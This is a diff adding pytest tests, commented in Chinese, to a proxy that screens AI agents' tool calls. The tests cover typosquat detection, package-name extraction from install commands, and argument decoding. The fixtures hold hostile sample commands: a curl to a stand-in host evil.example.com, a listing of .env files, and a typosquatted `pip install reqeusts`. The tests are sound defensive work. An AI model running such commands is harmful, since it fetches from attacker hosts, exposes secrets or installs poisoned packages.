@@ -39,7 +39,10 @@ if str(REPO / "src") in sys.path:
 sys.path.insert(0, str(REPO / "src"))
 
 from daoti_xuandun_personal.proxy.baseline import (  # noqa: E402
+    build_baseline,
     detect_typosquat,
+    diff_against_baseline,
+    extract_exec_hosts,
     extract_response_facts,
 )
 from daoti_xuandun_personal.reputation.tracker import (  # noqa: E402
@@ -409,3 +412,185 @@ class TestAmbiguousMigrationFallsBackToActive:
             active["base_url"], active["api_key"]
         )
         assert store.iter_log_facts()[0]["domain"] == key
+
+
+class TestStdlibIsNotTyposquat:
+    """Python 标准库模块不是 PyPI 包。
+
+    ★ 2026-11-26 生产日志复核：`import urllib.request` 出现在工具参数里，
+      `urllib` 与基准表里的 `urllib3` 只差一个字符，被判成错拼包并阻断。
+    """
+
+    @pytest.mark.parametrize("mod", [
+        "urllib", "asyncio", "ensurepip", "zipfile", "pathlib",
+    ])
+    def test_stdlib_module_is_not_typosquat(self, mod):
+        assert detect_typosquat(mod) is None, (
+            f"标准库 {mod!r} 被判成 typosquat —— 正常代码引用会被阻断"
+        )
+
+    def test_real_typosquat_still_detected(self):
+        """不能因为放过标准库，把真实攻击的错拼一起放过。"""
+        assert detect_typosquat("numpfy") == "numpy"
+
+
+class TestInstallCommandExtractionBoundaries:
+    """`pip install` 后面同一行的注释、选项、版本号、路径不是包名。
+
+    ★ 2026-11-26 生产日志复核：new_dependency 把
+      `already`、`satisfied`、`disable-pip-version-check`、
+      `0.1.99`、`11/11`、`bin/oxlint`、`win_amd64.whl` 当成了依赖包。
+    """
+
+    def test_comment_tail_is_not_packages(self):
+        f = _facts("RunCommand", "pip install ruff  # already satisfied")
+        assert f["exec_packages"] == {"ruff"}
+
+    def test_long_flag_is_not_package(self):
+        f = _facts("RunCommand", "pip install --disable-pip-version-check ruff")
+        assert "disable-pip-version-check" not in f["exec_packages"]
+        assert "ruff" in f["exec_packages"]
+
+    def test_requirements_file_is_not_package(self):
+        f = _facts("RunCommand", "pip install -r requirements.txt")
+        assert not f["exec_packages"], (
+            f"requirements.txt 被当成包名：{sorted(f['exec_packages'])}"
+        )
+
+    def test_versions_and_ratios_are_not_packages(self):
+        f = _facts("RunCommand", "npm install oxlint 21/21 56/56 3.12.0")
+        assert f["exec_packages"] == {"oxlint"}
+
+    def test_vcs_url_is_not_packages(self):
+        """`git+https://...` 的协议/VCS 片段不是包名。"""
+        f = _facts("RunCommand", "pip install git+https://github.com/x/y.git")
+        assert "git" not in f["exec_packages"]
+        assert "https" not in f["exec_packages"]
+
+    def test_index_url_is_not_package(self):
+        """`-i https://mirror.../simple` 的地址不是包名。"""
+        f = _facts(
+            "RunCommand",
+            "pip install -i https://mirror.example.com/simple requests",
+        )
+        assert "https" not in f["exec_packages"]
+        assert "requests" in f["exec_packages"]
+
+    def test_digit_leading_real_package_is_kept(self):
+        """`2captcha-python` 是真实包名，不能因为以数字开头就被丢掉。"""
+        f = _facts("RunCommand", "pip install 2captcha-python")
+        assert "2captcha-python" in f["exec_packages"]
+
+    def test_extras_are_not_package(self):
+        """`requests[security]` 的 extras 不是独立包名。"""
+        f = _facts("RunCommand", "pip install 'requests[security]>=2.0'")
+        assert "security" not in f["exec_packages"]
+        assert "requests" in f["exec_packages"]
+
+    def test_vcs_fragments_do_not_trigger_new_dependency(self):
+        b = build_baseline({
+            "model": "m",
+            "messages": [{"role": "user", "content": "从 git 源装个包"}],
+        })
+        facts = _facts("RunCommand", "pip install git+https://github.com/x/y.git")
+        findings = diff_against_baseline(b, facts, "")
+        assert not any(
+            f["category"] == "new_dependency" for f in findings
+        ), "VCS/协议片段被当成了新增依赖"
+
+    def test_stdlib_install_is_not_new_dependency(self):
+        b = build_baseline({
+            "model": "m",
+            "messages": [{"role": "user", "content": "跑个脚本"}],
+        })
+        facts = _facts("RunCommand", "pip install urllib")
+        findings = diff_against_baseline(b, facts, "")
+        assert not any(
+            f["category"] in ("new_dependency", "typosquat_package")
+            for f in findings
+        ), "标准库被当成了新增依赖或错拼包"
+
+    def test_real_typosquat_still_detected_end_to_end(self):
+        """放宽提取边界后，真实投毒仍必须命中。"""
+        b = build_baseline({
+            "model": "m",
+            "messages": [{"role": "user", "content": "装个包"}],
+        })
+        facts = _facts("RunCommand", "pip install reqeusts")
+        assert "reqeusts" in facts["exec_packages"]
+        findings = diff_against_baseline(b, facts, "")
+        assert any(
+            f["category"] == "typosquat_package" for f in findings
+        ), "reqeusts 没被检出 —— 放宽提取边界削弱了真检测"
+
+
+class TestToolArgumentsDecodedBeforeFacts:
+    """所有检测器都吃解码后的命令文本，description 不参与执行面。
+
+    ★ 2026-11-26：`extract_response_facts` / `extract_exec_hosts` 此前
+      直接吃 JSON 原文，`description` 里的网址和安装示例会被当成
+      「即将执行的端点 / 依赖」。统一解码后只取 command 字段。
+    """
+
+    @staticmethod
+    def _payload(tool_name: str, args: dict) -> dict:
+        return {"choices": [{"message": {"tool_calls": [{
+            "function": {
+                "name": tool_name,
+                "arguments": json.dumps(args, ensure_ascii=False),
+            },
+        }]}}]}
+
+    def test_description_url_is_not_exec_endpoint(self):
+        payload = self._payload("Shell", {
+            "command": "curl https://evil.example.com/x",
+            "description": "参考 https://benign.example.com 文档",
+        })
+        facts = extract_response_facts(payload, "")
+        assert "evil.example.com" in facts["exec_domains"]
+        assert "benign.example.com" not in facts["exec_domains"], (
+            "description 里的网址被当成了即将执行的端点"
+        )
+
+    def test_command_and_url_fields_are_both_exec_surface(self):
+        """一个良性 command 不能掩盖同调用里的 url 字段。"""
+        payload = self._payload("Shell", {
+            "command": "Get-ChildItem *.env",
+            "url": "https://evil.example.com/x",
+            "description": "参考 https://benign.example.com",
+        })
+        facts = extract_response_facts(payload, "")
+        assert "evil.example.com" in facts["exec_domains"]
+        assert "benign.example.com" not in facts["exec_domains"]
+
+    def test_gemini_args_are_decoded(self):
+        """Gemini functionCall.args 也必须走统一解码。"""
+        payload = {"functionCall": {"name": "Shell", "args": {
+            "command": "curl https://evil.example.com/x",
+            "description": "参考 https://benign.example.com",
+        }}}
+        facts = extract_response_facts(payload, "")
+        assert "evil.example.com" in facts["exec_domains"]
+        assert "benign.example.com" not in facts["exec_domains"]
+
+    def test_extract_exec_hosts_uses_command_only(self):
+        payload = self._payload("Shell", {
+            "command": "curl https://evil.example.com/x",
+            "description": "参考 https://benign.example.com 文档",
+        })
+        hosts = extract_exec_hosts(payload)
+        assert "evil.example.com" in hosts
+        assert "benign.example.com" not in hosts, (
+            "description 里的网址进了端点台账"
+        )
+
+    def test_description_install_is_not_package(self):
+        payload = self._payload("RunCommand", {
+            "command": "pip install ruff",
+            "description": "顺便说明：pip install reqeusts 是错拼示例",
+        })
+        facts = extract_response_facts(payload, "")
+        assert "ruff" in facts["exec_packages"]
+        assert "reqeusts" not in facts["exec_packages"], (
+            "description 里的安装示例被当成了即将安装的包"
+        )
